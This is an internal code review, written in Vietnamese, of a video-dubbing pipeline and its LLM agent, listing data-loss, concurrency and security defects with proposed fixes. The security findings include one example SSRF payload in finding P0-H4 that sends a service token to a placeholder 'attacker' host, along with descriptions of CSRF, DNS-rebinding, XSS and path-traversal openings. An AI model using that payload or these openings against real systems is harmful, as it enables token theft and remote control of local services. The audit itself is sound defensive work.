# Review code PinelineV2 + Agent — 2026-10-06

Review chỉ đọc code (không chạy, không sửa — trừ 1 lỗi do chính đợt 6/10 gây ra, đã sửa, xem P0-A1). 4 mảng: **server + queue**, **agent layer**, **Hongguo + UI + bảo mật + vệ sinh repo**, **media pipeline** (ASR/dịch/TTS/render — mục cuối). Số dòng là tại thời điểm review. Đã tự kiểm chứng: S1, S3, A1; M4 kiểm bằng dữ liệu thật và hạ từ P0 xuống P1.

> **Tiến độ sửa (cập nhật 06/10 15:20):** Đợt 7 (user chọn 14:50): gỡ UI cũ `index1/2.html` + route `/ui1`, `/ui2`; tách `server.py` 6221 → ~5,4k dòng (`routes_ui.py`, `routes_hg.py`, `routes_agent.py`), OpenAPI giống hệt — `docs/fixes/2026-10-06-batch7-ui-split.md`; còn tách phần jobs/pipeline của `server.py`, `hongguo_bridge`. Đợt 6 đã làm (git local, `pytest.ini` + test đợt/parser/M3, M3 sửa + test ffmpeg thật, dọn 29 script chết, sửa test hardsub) - `docs/fixes/2026-10-06-batch6-maintenance.md`; còn tách `server.py`/`hongguo_bridge`, bỏ hot-reload, gỡ UI cũ (cần user). Đợt 5 đã sửa (A7, A8, A9, A13, tầng quyền + nút ✅/❌ cho tool phá huỷ trên Telegram, cắt kết quả tool, SYSTEM bỏ `qa_override`, xoá `agent_v2` — xong X3) - `docs/fixes/2026-10-06-batch5-agent-safety.md`; còn tách dispatch if-chain / nạp tool theo nhóm. Đợt 4 đã sửa (S2, S8, S9, S10, S11, A5, A6, X4 phần `sync_pending_to_batch` qua `/api/queue/jobs/opts`, M10, M11, M12, M13) — `docs/fixes/2026-10-06-batch4-write-races.md`; X4 còn feeder/`feed_tick`/`hg_auto_flow`. Đợt 1 đã sửa (S1, S3, S6, S7, H1, H2, H3, H11, A3, A4, M2, M5) — `docs/fixes/2026-10-06-batch1-data-loss.md`. Đợt 2 đã sửa (S4, H4, H5, H6, A2, H7, M7, M8, M9; X2/X3 phần config agent) — `docs/fixes/2026-10-06-batch2-security.md`. Đợt 3 đã sửa (X1, X2, S13; X3 còn `agent_v2` để đợt 5 xoá) — `docs/fixes/2026-10-06-batch3-single-source.md`. **Đính chính A4:** `/dl/status` dùng khoá `sid`, nên `agent_hongguo` đúng; chỗ sai thật là `agent_feeder.mergeable`/`library_view` đọc `series_id` (đã sửa cùng đợt 1).

Mức: **P0** = mất dữ liệu / sai output / lỗ bảo mật; **P1** = lỗi thật hoặc xung đột sẽ gặp; **P2** = chất lượng / bảo trì.

## Tóm tắt

Hệ thống chạy được production, nhưng có 4 nhóm rủi ro lớn:

1. **Ghi đè / xoá dữ liệu âm thầm**: `GET /api/jobs` tự đánh stage "done" theo file; manifest bị nhiều luồng ghi đè nhau; `cleanup_fragments` xoá tập gốc khi chưa kiểm tra file gộp.
2. **Không có lớp bảo vệ HTTP**: :8801 và :8802 không auth, :8802 còn `Access-Control-Allow-Origin: *` → bất kỳ trang web nào mở trong trình duyệt cũng có thể ra lệnh agent (mutate), dừng job, đổi config, kéo file; `/api/hg/img?base=` làm lộ token Hongguo (SSRF).
3. **Nhiều nguồn sự thật**: 6 bộ mặc định opts render/audio khác nhau, 5+ nguồn config với thứ tự ưu tiên khác nhau, 3 agent đọc LLM theo 3 kiểu, 5 luồng tự động cùng ghi hàng đợi.
4. **Quản lý tiến trình đoán mò**: junction `work → D:` làm Stop không kill được ffmpeg và heal có thể xoá `output.partial.mp4` đang ghi; không khoá 1 instance cho server/sidecar.

## Xung đột đang tồn tại (trả lời "điểm nào còn xung đột")

| # | Xung đột | Ở đâu | Hệ quả |
|---|---|---|---|
| X1 | **6 bộ mặc định opts**: `RunAllReq`/`MuxReq` (voice_bgm, 0.6, 8M) vs `_queue_run_one` (duck_bgm, 0.22) vs `_agent_mux_run` (duck_bgm, 0.28, 4M, ép motion/lut/fit, tắt logo/frame) vs `batch_config.DEFAULTS` (duck_bgm 0.22 8M) vs `run_stage` mux | `server.py:788-850, 3335, 5587-5606`, `batch_config.py:16-38` | Cùng 1 job ra output khác nhau tuỳ đường gọi (UI / queue / agent / watcher `mux_retry` render 4M không logo) |
| X2 | **Thứ tự ưu tiên config**: server copy file → env bằng `setdefault` lúc start; `config.py` đọc env trước cho key không-LLM → sửa `pineline.config.json` không có tác dụng dù render reload; `render.py:650` đọc `RENDER_ENCODER` env trước, trái `config.py:55`; `LLM_*` trong `run_v2.bat` là code chết; `AGENT_*` vẫn env-first | `server.py:33-48`, `config.py:52-78`, `render.py:650-656`, `app.py:24-32` | "Đổi config mà không ăn"; model agent có thể bị env cũ đè (sự cố deepseek 5/10 có thể lặp) |
| X3 | **3 agent đọc LLM khác nhau**: `agent_core` (gemma4 cloud), `agent_feeder` (env-only, mặc định `qwen36-tq3`), `agent_v2` (ghép `LLM_BASE_URL` local với `AGENT_MODEL` cloud) | `agent_feeder.py:748-753`, `agent_v2/agent.py:30-34` | Feeder dùng model/endpoint khác hẳn agent chính |
| X4 | **5 luồng cùng ghi hàng đợi không khoá** (autopilot top-up, `sync_pending_to_batch` xoá-hết-rồi-thêm, feeder `_requeue_front`, `feed_tick`, `hg_auto_flow`) | `agent_autopilot.py:130-201`, `agent_feeder.py:909-922` | Mất opts đã pin, đảo thứ tự hàng đợi |
| X5 | **Server ↔ sidecar phụ thuộc vòng**: tool trong server gọi sidecar `:8802/cmd`; sidecar gọi server cho mọi thứ; `agent_hongguo` gọi HTTP vào chính server | `agent_core.py:826-832`, `agent_hongguo.py:658,1042,1098` | Trạng thái (rank cache, số thứ tự `/lib`, merge fallback) khác nhau theo tiến trình → "bộ số 3" ở Telegram ≠ "bộ số 3" ở chat |
| X6 | **Hot-reload theo request** (`importlib.reload` ~20 handler `/api/hg/*`, render mỗi lần mux, `translate_fill` dùng `translate` mới trong khi queue dùng bản import lúc start) | `server.py:2877-2883, 3054-3056, 5135-5466` | 2 phiên bản code chạy song song; reset cache token → mỗi request HG spawn PowerShell |
| X7 | **Hai cách định nghĩa work root** (`Path("work")` tương đối vs đường dẫn theo file) + 2 cache tên HG (`hg_title_cache.json` vs `_hg_title_cache.json`) + danh sách stage lặp | `server.py:82`, `job_queue.py:11-12`, `batch_config.py:14`, `title_mt.py:19` | Chạy từ cwd khác → tách state |
| X8 | **Môi trường thực tế ≠ tài liệu**: server hiện chạy bằng `start_8801.py` → `AGENT_WATCH=0` (watcher tắt), không có `AGENT_FALLBACK_MODEL`; `run_v2.bat` lại bật cả hai. Sidecar `TEMP` vẫn ổ C. Skill `.cursor/skills/pineline-agent/SKILL.md` còn trỏ V1 :8800 | `D:\PinelineV2_tmp\start_8801.py`, `run_v2.bat` | Hành vi tuỳ cách khởi động; agent/IDE đọc tài liệu sai |
| X9 | **UI nhân bản**: `index.html`, `index1/2.html`, `index3.html` (sinh bởi `_build_index3.py` rồi sửa tay), `static/app.js` cùng một codebase JS | `_build_ui_variants.py`, `_build_index3.py` | Lỗi nhân đôi (XSS ở 2 file); chạy lại builder sẽ xoá sửa tay |

## P0

### Server / queue

- **P0-S1 — `GET /api/jobs` ghi manifest và đánh failed/partial thành done.** `server.py:1370-1376` → `_heal_stages_from_disk` (`580-596`) dựa trên kiểm tra file lỏng (`538-562`): TTS "done" nếu có bất kỳ `seg_*.wav` (ghi `n_missing: 0`), mux "done" nếu `output.mp4` ≥1000 byte (kể cả bản cũ), translate "done" nếu có `script.json` dở. Sau Stop / TTS lỗi, lần poll UI kế tiếp biến job thành done → queue bỏ qua hoặc render thiếu clip. _Đã kiểm chứng._ **Sửa:** `read_job` chỉ đọc; heal chuyển sang endpoint/worker riêng; không bao giờ nâng `failed` → `done`; yêu cầu đủ số lượng (số clip TTS = số dòng script).
- **P0-S2 — Manifest read-modify-write ghi đè nhau.** `manifest.py:56-66, 95-103` khoá chỉ từng lần đọc/ghi; `Manifest()` sống lâu (`m_early` render, TTS orchestrator, vòng dịch) `save()` cả snapshot cũ; `_patch_tts_fields`/`_patch_asr_fields` (`server.py:2521-2549, 2681`) bỏ qua lock, dùng chung tên temp. Mất `title_vi`, cờ HOLD/QA (`_agent_set_hold` `5513-5531`) → job có thể đi TTS mà không qua review. **Sửa:** `Manifest.update(fn)` (lock theo path → đọc lại → áp → ghi atomic); tiến độ stage ghi file riêng `stage_progress.json`.
- **P0-S3 — Junction `work → D:` làm hỏng nhận diện ffmpeg.** `server.py:182-188, 409-419` so `(WORK_ROOT/job_id).resolve()` (ra `D:\PinelineV2_work\…`) với `cwd` của ffmpeg (psutil báo `Z:\PinelineV2\work\…`) → không bao giờ khớp. Stop không kill ffmpeg encode; `_heal_stale_running` kết luận ffmpeg chết và **xoá `output.partial.mp4` đang ghi** (`196-199`) — chạy từ watcher 300 s, run-all, Stop. _Đã kiểm chứng. Hiện watcher tắt nên rủi ro thấp hơn, nhưng Stop/run-all vẫn dính._ **Sửa:** `os.path.realpath` cả hai phía; tốt hơn: ghi PID ffmpeg vào `_PROCS`/file PID theo job.
- **P0-S4 — Không auth, không kiểm Host.** `server.py` bind 127.0.0.1 nhưng không `TrustedHostMiddleware`/token. `POST /api/cookies` (multipart) ghi đè cookies từ trang lạ; `run/{stage}?force=true`, `queue/jobs/stop|clear`, `/reveal`, `/api/hg/cancel`, `/api/hg/merge-queue/clear` gọi được bằng form; DNS rebinding đọc được `/api/fs/list-dirs`, kéo file bất kỳ qua `local-path move` rồi đọc qua `/file/...`. **Sửa:** `TrustedHostMiddleware(["127.0.0.1","localhost"])` + header token sinh lúc start (chia cho UI/sidecar qua file) cho mọi non-GET + chặn `Sec-Fetch-Site: cross-site`; `force` chuyển vào JSON body.

### Agent

- **P0-A1 — Parser tool call dạng chữ chạy tool chỉ được nhắc tới.** (lỗi do đợt sửa sáng 6/10, chưa nạp vào server) → **ĐÃ SỬA** 06:00: chỉ nhận lời gọi đứng riêng / sau `Action:`, không parse sau khi đã có tool chạy, bắt `TypeError` cho `...`. `fixes/2026-10-06-agent-text-toolcall-overmatch.md`.
- **P0-A2 — Sidecar `:8802` CSRF.** `agent_tele_cmd.py:793-796` (`ACAO: *`), `935-939` parse JSON bất kể Content-Type → POST `text/plain` từ mọi trang tới `/cmd` → `agent_chat(allow_mutate=True)`, `/restartserver`, `hard_stop`, `/reset`, `/library/action`. Allow-list Telegram không che đường này. **Sửa:** header bí mật chung (`.env`), bắt `Content-Type: application/json`, ACAO chỉ `http://127.0.0.1:8801`, chặn Origin lạ.
- **P0-A3 — `hg_auto_flow` với số thứ tự có thể làm sai phim.** `agent_hongguo.py:880-884, 935-940`: "làm bộ số 3" chỉ map khi `_LAST_RANK_CACHE` có dữ liệu (cache theo tiến trình — Telegram điền ở sidecar, chat chạy trong server). Cache rỗng → nhánh C khớp chuỗi con "3" (第3季, 2023) → gộp, **xoá tập lẻ**, tạo job nhầm. **Sửa:** số trần + không có danh sách → báo lỗi; lưu "danh sách vừa hiển thị" theo chat_id ở 1 nơi; nút truyền `series_id`.
- **P0-A4 — Hết giờ tải vẫn đi tiếp gộp + xoá.** `agent_hongguo.py:976-996, 1018-1030`: 2 vòng chờ 30 phút thoát không kiểm tra timeout; so `s.get("sid")` trong khi mọi chỗ khác dùng `series_id`. **Sửa:** trả `download_timeout`; khớp `series_id`; trước khi gộp yêu cầu `fragments >= total` (như `agent_feeder.mergeable`).

### Hongguo / UI / bảo mật

- **P0-H1 — `cleanup_fragments` xoá quá rộng, không kiểm file gộp.** `hongguo_bridge.py:1219-1251`: xoá mọi `.mp4/.mkv/.webm/.ts/.mov` không chứa "merged" (trailer, mùa khác để chung folder, file tải dở) chỉ cần có 1 file `(merged)`. Không so thời lượng/kích thước. `tool_hg_clean` lấy `matches[0]` từ khớp chuỗi con. **Sửa:** chỉ xoá file khớp `_FRAG_RE`; điều kiện: merged > 0, `ffprobe` ≥ 98% tổng thời lượng tập, mtime merged mới hơn tập mới nhất; chuyển vào `.trash/` giữ N ngày; tên folder phải khớp chính xác.
- **P0-H2 — Tập tải sau khi đã gộp bị xoá mà không gộp.** `hongguo_bridge.py:1632-1647, 1700-1733`: đã có merged + còn tập → nhảy thẳng `cleanup_fragments`. **Sửa:** có tập mới hơn merged hoặc số tập vượt phạm vi merged → gộp lại, không dọn.
- **P0-H3 — Poll gộp báo xong trước khi Hongguo bắt đầu.** `hongguo_bridge.py:1838-1877`: `not running and name != name → ok` ngay sau `merge_one`; chờ 30 s rồi dọn; `mark_done`/`_merge_done` ghi kể cả khi folder `None`. **Sửa:** chỉ coi xong khi đã thấy `running` với đúng tên ít nhất 1 lần rồi mới hết; kiểm file như H1 trước `mark_done`.
- **P0-H4 — SSRF + lộ token Hongguo.** `server.py:5119-5121` `_hg_base(override)` nhận URL tuỳ ý từ query/body; `_req` gắn `x-hg-token` + cookie `hg_ui_<port>` cho mọi request (`hongguo_bridge.py:648-680`); `fetch_img_proxy` thêm `url` tuỳ ý. `<img src="http://127.0.0.1:8801/api/hg/img?url=x&base=http://attacker">` gửi token cho kẻ tấn công; `/dl/config` giả còn điều khiển `output_dir` → đường gộp/xoá. **Sửa:** bỏ `base` khỏi mọi endpoint, chỉ đọc config, allowlist `127.0.0.1:8000`; không gửi header auth tới host ngoài allowlist; allowlist host CDN cho `hg_img`.
- **P0-H5 — Tên thư viện nối vào đường dẫn không kiểm.** `hongguo_bridge.py:1621-1647` (`root / n` rồi `cleanup_fragments`), `1133, 1150` (chặn `..`/`/`/`\` nhưng không chặn `C:x`). **Sửa:** sau khi nối yêu cầu `p.resolve().parent == root.resolve()`, cấm `:` (dùng lại mẫu `server.py:5105-5108`).
- **P0-H6 — XSS qua tên nhóm.** `index3.html:796-797`, `index.html:650`: `onclick="renameGroup('${gid}',${JSON.stringify(gt)})"` — dấu `"` đóng thuộc tính (nút đã hỏng với mọi tiêu đề), tiêu đề video/playlist có thể chèn handler; `escapeHtml` (`index3.html:479`) không thoát `'`. **Sửa:** `data-*` + bind handler trong JS; thêm `'` → `&#39;`.
- **P0-H7 — Secret dạng chữ trong 5+ file** (chỉ ghi tên khoá): `pineline.config.json` (`LLM_API_KEY`), `config.json` (`LLM_API_KEY`), `run_v2.bat`/`run_tele_cmd.bat` (`AGENT_API_KEY`), docstring `llm.py:6`, `.claude/settings.local.json`; Telegram token trong `.env` mà `backup.py`/`backup_5060ti.py` không loại trừ (`snapshot.py` cũng không loại `*.bat`/config). Thêm: user đã dán API key 9router và OAuth client secret vào chat. **Sửa:** xoay (rotate) key; chỉ đọc từ `.env` (loại khỏi backup); `pineline.config.example.json` để trống; xoá khỏi docstring.

## P1

### Server / queue
- **S5** `_resolve_asr_engine` có tác dụng phụ nặng — mỗi lần chạy queue (cả `_agent_resume` sau HOLD/QA) ghi lại `asr.json`, đè `.bak`, đặt translate `pending/reviewed:False`, TTS → stale; ghi đè lựa chọn `asr-select` thủ công. `server.py:2694-2725, 3566-3709`. → tách hàm thuần + `set_asr_engine` chỉ khi engine thật sự đổi.
- **S6** Restart mất opts của job đang chạy: `job_queue.py:328` pop `_opts_by_job`, `_load` (`110-113`) và `restart_server.py:25-28` gán opts toàn cục. → giữ snapshot tới khi xong hoặc lấy `queue_opts` từ manifest.
- **S7** Resume sau HOLD/QA mất brand/logo/frame: stamp `queue_opts` (`server.py:3346-3360`) thiếu `brand*`, `frame` → mọi job đã review render **không watermark kênh**. → stamp `dict(opts)` đầy đủ.
- **S8** Endpoint bỏ qua claim stage (`regen_tts`, `mux_job`, `retranslate_job`, `translate_fill`, `assemble_job` chạy đồng bộ ghi `dub_fit.wav` khi render đang đọc); watcher heal trước GPU gate (`agent_watch.py:229-245`); TTS orchestrator không có trong `_PROCS`. → 1 helper `with job_claim(job_id, stage)`.
- **S9** `mark-done` khi job đang chạy gỡ claim `__all__` + xoá cờ Stop (`server.py:3010-3013`) → 2 stage chạy song song. → 409 nếu `_job_in_pipeline`.
- **S10** Queue worker khởi động lúc import, trước `startup` reset (`server.py:5477` vs `644-682`) → mỗi lần restart có queue: worker đánh running rồi startup reset + có thể kill engine vừa spawn. → start worker cuối handler startup.
- **S11** Không khoá 1 instance server; `_iter_job_engine_procs` khớp job_id toàn hệ thống (có thể kill tiến trình V1 cùng URL); `_kill_job_children` kill mọi `vieneu_batch`. → lock file `msvcrt.locking`; khớp đường dẫn work tuyệt đối.
- **S12** `vram.free_gpu_vram` gọi `torch.cuda.ipc_collect()` trong server → tạo CUDA context ~300–500 MB VRAM suốt đời server; thread timeout 25 s rò. `vram.py:49, 85-89`. → bỏ `_empty_torch` khỏi server.
- **S13** `batch_config.json` / `autopilot_state.json` ghi không atomic, không khoá liên tiến trình; `load()` nuốt lỗi parse → trả DEFAULTS → Auto-pilot xếp job sai giọng/audio. `batch_config.py:97-143`, `agent_autopilot.py:35-38`. → temp + `os.replace`, lock file, log to khi parse lỗi.
- **S14** Sửa script/TTS qua UI ghi không atomic, đua với worker dịch (`server.py:3143, 3171, 3214, 4036`). → atomic + lock hoặc 409 khi đang dịch/review.

### Agent
- **A5** Sidecar trùng: mọi loop (kể cả `telegram_loop`) chạy trước khi bind HTTP; `allow_reuse_address=True` trên Windows cho bản thứ 2 bind cùng cổng → nguyên nhân khả dĩ của **bot trả lời 2 lần**; autopilot/feeder chạy đôi. `agent_tele_cmd.py:1256-1263`. → lock 1 instance + `SO_EXCLUSIVEADDRUSE`, bind trước rồi mới start thread.
- **A6** Autopilot xếp lại job `failed` mỗi 90 s (`need_queue` gồm failed) → job lỗi cố định chạy lặp vô hạn. `agent_core.py:1041`, `agent_autopilot.py:183-201`. → bỏ failed hoặc retry budget + backoff theo `agent_error_class`.
- **A7** `hg_auto_flow` chặn HTTP tới ~90 phút (3 vòng 1800 s) trong khi sidecar timeout 180 s → user thấy "Read timed out", flow vẫn chạy, có thể khởi động flow thứ 2. → chạy nền, trả `flow_id`, thêm `hg_flow_status`, registry chống trùng theo `series_id`.
- **A8** Từ thường trong Telegram kích hoạt lệnh phá huỷ: "stop job X thôi" → `hard_stop` tất cả; "reset …" xoá config; "feed là gì?" bật feeder; "autopilot có chạy không?" bật autopilot. `agent_tele_cmd.py:561-769`. → chỉ lệnh `/` mới mutate.
- **A9** Telegram xử lý tuần tự: agent nghĩ 180 s thì `/stop` phải chờ; `offset=-1` khi boot âm thầm bỏ lệnh gửi lúc sidecar tắt. → xử lý `/stop /off /status` ngay; agent chat qua worker thread.
- **A10** `feed_tick` load state → gọi mạng lâu → save, đè `/feed off` gửi giữa chừng. `agent_feeder.py:676-705`.
- **A11** Job từ `hg_auto_flow` không `pin_opts` → config-live sync đảo giọng đã yêu cầu; ghi `tts_config.json` từ sidecar. `agent_hongguo.py:1117-1161`.
- **A12** Kiểm trùng theo tiêu đề hiển thị (đổi thành `title_vi` sau dịch) → bỏ sót, trả `ok:true, job_id: None`; nhánh A/B fallback `items[0]` làm lại phim đã xong. → kiểm theo source path / `film_db.series_ids()`.
- **A13** Định tuyến từ khoá bằng chuỗi con ("kho" ⊂ "khoảnh khắc", "top" ⊂ "Stop", "hot" ⊂ "Hotel") → thay tên phim thật bằng "bộ hot #1". → tham số `mode` enum.

### Hongguo / UI
- **H8** Mỗi request HG spawn PowerShell: `_ui_token_cache` (`hongguo_bridge.py:30`) bị reset mỗi lần reload; `hongguo.html` poll 4 s. → giữ cache qua reload / bỏ reload.
- **H9** `importlib.reload` khi merge worker đang sống — không thread-safe. → bỏ reload theo request.
- **H10** `merge_queue_add` chạy `merged_has_mixed_res` + `normalize_merged_file` (re-encode hàng chục phút) **trong HTTP request**. → chỉ validate + enqueue.
- **H11** Normalize lỗi vẫn dọn tập (`hongguo_bridge.py:1638-1642, 1726-1728`). → chỉ dọn khi `ok`/`skipped`.
- **H12** Clear queue có thể để worker dừng vĩnh viễn (`_merge_stop` không reset khi thread cũ còn sống). → `threading.Event` theo lượt.
- **H13** Vòng chờ / subprocess không timeout (`1774-1791`, `1526-1549`, `1443-1455`). → deadline + stall check + kill khi stop.
- **H14** Temp normalize rò sau crash (`hg_norm_merge_*`, `*.tmp.mp4`). → temp trong `<output_dir>/.hg_tmp/`, dọn lúc start.
- **H15** `hg_title_cache.json` ghi đa luồng không khoá (6–8 worker). → lock + atomic.
- **H16** UI poll chồng nhau, không dừng khi tab ẩn, nuốt lỗi (`index3.html:2378` 2 s × 3 request, `index4.html:1063`, `hongguo.html:1475`). → `setTimeout` chuỗi, bỏ qua khi `document.hidden`, backoff.
- **H17** `install.py:136, 179-186` ghi đè toàn bộ `pineline.config.json` và tạo `start.bat` trỏ `app.py` :8800. → merge key, backup trước.
- **H18** `_read_hg_ui_token.py:86-90` in token + biến môi trường bí mật. → xoá hoặc chỉ in độ dài.

## P2

- **Server**: path param không validate thống nhất (`_job_dir()` regex `^[A-Za-z0-9_-]+$`); `_auto_gpu` nuốt mọi exception → lịch sử queue mất nguyên nhân thật (`server.py:1187-1198`); ETA queue luôn rỗng do `float()` trên chuỗi ISO (`1946-1950`), `finished_at` lẫn float/ISO; poll nặng (parse `script.json` mỗi job mỗi lần, kích hoạt dịch tiêu đề); `server.py` ~6.000 dòng, 104 route, ~200 `except Exception` (60 `pass`), 73 chỗ `Manifest(`.
- **Agent**: kết quả tool đưa nguyên vào context (status indent=2, library, rank 100) trên 55 schema + SYSTEM ~5k ký tự cho model nhỏ → cắt 4–6k, nạp tool theo nhóm; hết bước không liệt kê thao tác đã mutate; mọi HTTP 400 chuyển sang text protocol; SYSTEM mâu thuẫn (tool `qa_override` không tồn tại, quy tắc 3 "xác nhận trước" vs 5/14 "làm ngay"); `agent_v2/` bản cũ lệch (cứng v5/0.28/duck_bgm, không gate `queue_stop`); `/agent` hạ chữ thường làm hỏng job id; dispatch if-chain 370 dòng.
- **Hongguo/repo**: normalize crash giữa 2 lần rename làm "mất" file gộp; ~20 script một lần ở gốc (`_patch_frame_wh.py` còn ghi vào V1); UI chết (`index1/2.html`, `_hg_dl_ui.html`, có thể `index.html`); `config.json` + profile thủ công; `requirements.txt` không pin, thiếu `psutil`; `film_db` không đóng connection, chạy `executescript(SCHEMA)` mỗi lần; tests chỉ phủ queue + agent smoke (gọi LLM thật), không `pytest.ini`; không có git.

## Nhận xét kiến trúc

- **Quá nhiều bên cùng ghi `manifest.json`** (queue thread, pool download/GPU/misc, watcher, handler HTTP kể cả GET, subprocess stage, sidecar). Một module ghi duy nhất + update atomic sẽ xoá cả một lớp lỗi (S1, S2, S8, S14).
- **"Tuần tự" chỉ đúng một nửa**: dựa vào `JOB_WORKERS=1` + `_STAGE_BUSY`, nhưng nửa số endpoint bỏ qua. Queue chưa phải cửa duy nhất cho việc GPU.
- **Không có nguồn sự thật duy nhất cho opts** (X1) và **config** (X2). Đề xuất `resolve_job_opts(job)` = `batch_config.load()` ⊕ `queue_opts` của job, dùng ở mọi đường render; config chỉ đọc qua `config.get`.
- **Hai tiến trình chia đôi trách nhiệm** (X4, X5). Nên để server sở hữu queue/feeder/library/state; sidecar chỉ là front-end Telegram + HTTP, gọi 1 endpoint atomic `POST /api/queue/replace`.
- **Quyền agent là 1 boolean** `allow_mutate` (luôn True ở Telegram/`/cmd`). Nên chia 3 tầng: đọc / mutate an toàn (queue_add, run_stage) / phá huỷ (hg_clean, stop, queue_stop, reset config, heal aggressive) — tầng phá huỷ cần token xác nhận 2 bước. Registry `{name: (schema, handler, tier)}` thay if-chain.
- **Hot-reload thay cho deploy** là gốc của X6, H8, H9; tồn tại vì state job/queue nằm trong RAM nên ngại restart. Khi state đã bền (file/SQLite) thì restart rẻ, bỏ được reload.
- **Không có version control** → mọi khôi phục dựa vào zip backup; đề xuất `git init` local + `.gitignore` (work/, data/, cookies/, secret, log, model weights) + `gitleaks` pre-commit.

## Lộ trình đề xuất

| Đợt | Việc | Ảnh hưởng | Cần restart |
|---|---|---|---|
| **1 — Chặn mất dữ liệu** (nhỏ, an toàn) | S1 (`read_job` chỉ đọc), S3 (`realpath`), H1+H2+H3+H11 (`cleanup_fragments` chặt + kiểm thời lượng + `.trash`), A3+A4 (`hg_auto_flow` số trần / timeout), S7 (stamp đủ opts) | Hết đánh "done" sai, hết xoá tập gốc, hết mất watermark | Server + sidecar |
| **2 — Đóng cửa HTTP** | S4+H4 (Trusted host + token + bỏ `base`), A2 (sidecar token, bỏ `ACAO *`), H5 (path check), H6 (XSS), H7 (rotate key → `.env`) | Trang web lạ không điều khiển được máy | Server + sidecar + Ctrl+F5 UI |
| **3 — Một nguồn sự thật** | X1 `resolve_job_opts`, X2 config chỉ qua `config.get` + `AGENT_*` file-first + bỏ `LLM_*`/`openclaw` trong `.bat`, X3 `llm_client.resolve(role)`, S13 atomic + lock | Hết lệch config theo đường gọi | Server + sidecar |
| **4 — Đồng thời & tiến trình** | S2 `Manifest.update`, S8/S9 `job_claim`, S10 start worker sau reset, S11+A5 lock 1 instance, X4 endpoint queue atomic, A6 không requeue failed | Hết race, hết bot trả lời đôi | Server + sidecar |
| **5 — Agent an toàn hơn** | Phân tầng quyền + xác nhận tool phá huỷ, A7 flow chạy nền, A8 chỉ lệnh `/` mới mutate, cắt kết quả tool, gọn SYSTEM, xoá `agent_v2` | Agent không làm bậy khi model hiểu sai | Server + sidecar |
| **6 — Bảo trì** | `git init`, tách `server.py` thành router + services, tách `hongguo_bridge`, bỏ hot-reload, dọn script/UI chết, `pytest.ini` + test cho S1/S2/S5/S6/H1/parser | Sửa nhanh, ít hồi quy | — |

## Quick wins (rẻ nhất, giá trị cao nhất)

1. Xoá lời gọi `_heal_stages_from_disk` + lưu `n_missing` trong `read_job` (`server.py:1373, 1449-1458`).
2. `os.path.realpath` cả hai phía trong `_cwd_is_job` / `_heal_stale_running`.
3. `cleanup_fragments`: chỉ xoá file khớp `_FRAG_RE` và chỉ khi `ffprobe` merged ≥ 98% tổng tập; chuyển vào `.trash/`.
4. Sidecar: token header + bỏ `ACAO *` + lock 1 instance; server: `TrustedHostMiddleware` + bỏ tham số `base`.
5. Rotate API key 9router + OAuth client secret (đã lộ trong chat), chuyển key sang `.env`, bỏ `openclaw`/`LLM_*` khỏi `.bat`, thêm `AGENT_*` vào file-first.

## Media pipeline (ASR / dịch / TTS / assemble / render)

### P0
- **P0-M1 — SenseVoice trả mốc giả.** `sensevoice_asr.py:179-197` gọi `generate(..., merge_vad=True)` không bật `output_timestamp` → rơi vào nhánh "chỉ có text" (`fun_asr_nano.py:147-157`, `st=0, en=audio_dur`) → `_spread_sentences` chia đều cả file theo số ký tự. Phim nhiều giờ: sub và khe TTS lệch hàng phút. Chỉ dính khi chọn engine SenseVoice (batch hiện dùng `fun_asr_nano`). **Sửa:** cắt theo VAD như Nano hoặc bắt buộc có timestamp, không có thì fail.
- **P0-M2 — `ensure_job_audio_ts` không an toàn khi crash.** `media_ts.py:183-235`: ghi lại JSON/SRT từng file, thay `audio.wav` gần cuối, ghi dấu `MARK` sau cùng; chết giữa chừng → lần sau chỉnh mốc **lần 2** cho file đã chỉnh; `shutil.copy2` (`:192, :210`) đè backup gốc bằng bản dở. **Sửa:** marker "started" + danh sách file, không đè backup đã có, ghi `.tmp` rồi `os.replace` cuối cùng, quyết định "đã sửa" theo marker.
- **P0-M3 — Biểu thức che hardsub lồng quá sâu (chưa thử thực tế).** `render.py:1608-1612, 1744-1748`: `_pw` tạo `if(lt(t,..),..,if(...))` mỗi đoạn 1 tầng; parser biểu thức ffmpeg giới hạn đệ quy (~100 tầng). Phim ghép nhiều tập đổi vị trí hardsub có thể vượt → filter lỗi "Invalid argument" → render fail (không phải lỗi NVENC nên không fallback). **Sửa:** mỗi cặp (cao, đỉnh) 1 chain với `enable=between(...)+...` phẳng hoặc `sendcmd`; test 200+ đoạn với lavfi.

### P1
- **M4 WAV > 4 GiB** (`render.py:2192` `mixed_audio.partial.wav` stereo 44,1k; `separate.py:95` Demucs `no_vocals.wav`): vượt 4 GiB khi > ~6,8 h. _Kiểm chứng 6/10: ffmpeg vẫn đọc đúng (0281: `mixed_audio.wav` 8,56 GiB, output tiếng 52.132,15 s đủ dài)_ → không hỏng ở đường ffmpeg, nhưng thư viện Python đọc WAV và Demucs (nạp cả bài vào RAM ~12,7 GB cho 10 h) vẫn rủi ro. **Sửa:** `-rf64 auto` cho mọi output PCM, Demucs `--flac` + cắt khúc 10 phút.
- **M5** Câu TTS "chạy quá" bị cắt sai độ dài sau khi nén: `assemble.py:304-314` cắt `dur*sr` thay vì `dur/ratio` → clip dài tới 1,6× khe, đẩy các câu sau; `compute_fit_placements` (`:178`) lại dùng `dur/ratio` → sub và tiếng không khớp. **Sửa:** cắt trước khi nén hoặc cắt `dur/ratio`.
- **M6** Mốc sub tính lại với tham số khác tiếng: `render.py:2361` `write_fit_timings` dùng `_resolve_max_speed(None)` thay vì mode/speed trong `.fit_mode`; vòng đặt câu tồn tại 2 bản đã lệch nhau (`assemble.py:153-196` vs `264-344`). **Sửa:** 1 hàm đặt câu trả về cả mốc và kế hoạch mẫu, đọc từ `FIT_STAMP`.
- **M7** LLM sập → bão chia đôi + retry: `translate.py:1232-1243` bắt mọi exception và chia đôi lô → 1 lô 50 dòng = 99 lần `chat()` × 4 retry × tới 300 s; xong vẫn đánh stage `done` với dòng trống. `llm.py:250-258` retry cả 4xx. **Sửa:** `LLMTransportError` → dừng/tạm stage; chỉ chia khi parse lỗi; không retry 4xx (trừ 429).
- **M8** `llm.py` bơm config vào env lúc import (`:37-58`), `translate.MODEL`/`REVIEW_MODEL` đóng băng lúc import, `chat_with_meta` dùng `BASE_URL`/`API_KEY` snapshot → phá cơ chế file-first của `config.py` (liên quan X2); key trong docstring `llm.py:6`.
- **M9** Tiền tố model `local/` gửi request kiểu Ollama `/api/chat` tới llama-server :8083 (`llm.py:63, 130`) → luôn fail, trả `""`, bị hiểu là "lô quá lớn". **Sửa:** `OLLAMA_BASE_URL` riêng (:11434).
